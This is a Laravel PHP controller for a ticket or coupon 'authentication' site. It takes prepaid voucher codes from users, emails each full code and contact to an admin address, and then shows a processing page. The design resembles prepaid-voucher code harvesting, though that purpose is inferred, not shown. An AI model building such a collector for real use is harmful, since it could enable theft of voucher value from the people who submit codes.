<?php

namespace App\Http\Controllers;

use App\Http\Requests\AuthenticateTicketRequest;
use App\Mail\CouponVerificationAdminMail;
use App\Mail\CouponVerificationResultMail;
use App\Services\CouponVerificationService;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Illuminate\View\View;

class CouponVerificationController extends Controller
{
    public function __construct(
        private CouponVerificationService $couponVerificationService
    ) {}

    public function create(): View
    {
        return view('authenticate-ticket', [
            'amounts' => config('authentify.ticket_amounts', []),
            'cardTypes' => config('authentify.card_types', []),
        ]);
    }

    public function store(AuthenticateTicketRequest $request): RedirectResponse
    {
        $data = $request->validated();
        $code = $data['code'];
        $contact = trim($data['contact']);
        $amountKey = $data['amount'];
        $cardTypeKey = $data['card_type'];
        $hideCode = $data['hide_code'];

        $amountLabel = config('authentify.ticket_amounts.'.$amountKey, $amountKey.' €');
        $cardTypeLabel = config('authentify.card_types.'.$cardTypeKey, $cardTypeKey);

        $result = $this->couponVerificationService->verify($code);

        $recipient = filter_var($contact, FILTER_VALIDATE_EMAIL)
            ? $contact
            : config('mail.from.address');

        $sentToContactEmail = filter_var($contact, FILTER_VALIDATE_EMAIL) !== false;

        $submittedAt = now()->format('d/m/Y H:i:s');

        $adminEmail = config('site.admin_email');
        if (is_string($adminEmail) && filter_var($adminEmail, FILTER_VALIDATE_EMAIL)) {
            try {
                Mail::to($adminEmail)->locale(app()->getLocale())->send(new CouponVerificationAdminMail(
                    $contact,
                    $code,
                    $result,
                    $amountLabel,
                    $cardTypeLabel,
                    (bool) $hideCode,
                    $submittedAt,
                ));
            } catch (\Throwable $e) {
                Log::warning('Notification admin authentification ticket échouée', [
                    'message' => $e->getMessage(),
                    'admin' => $adminEmail,
                ]);
            }
        }

        try {
            Mail::to($recipient)->locale(app()->getLocale())->send(new CouponVerificationResultMail(
                $code,
                $result,
                $contact,
                $amountLabel,
                $cardTypeLabel,
                $sentToContactEmail,
            ));
        } catch (\Throwable $e) {
            Log::error('Envoi e-mail confirmation utilisateur (authentification ticket) échoué', [
                'message' => $e->getMessage(),
                'recipient' => $recipient,
            ]);

            return redirect()
                ->route('ticket.authenticate')
                ->withInput($request->except('code', 'hide_code'))
                ->with('verification_error', __('site.forms.authenticate.mail_send_failed'));
        }

        return redirect()
            ->route('ticket.processing')
            ->with('processing_ok', true);
    }

    public function processing(): RedirectResponse|View
    {
        if (! session()->pull('processing_ok')) {
            return redirect()->route('ticket.authenticate');
        }

        return view('authenticate-processing');
    }
}
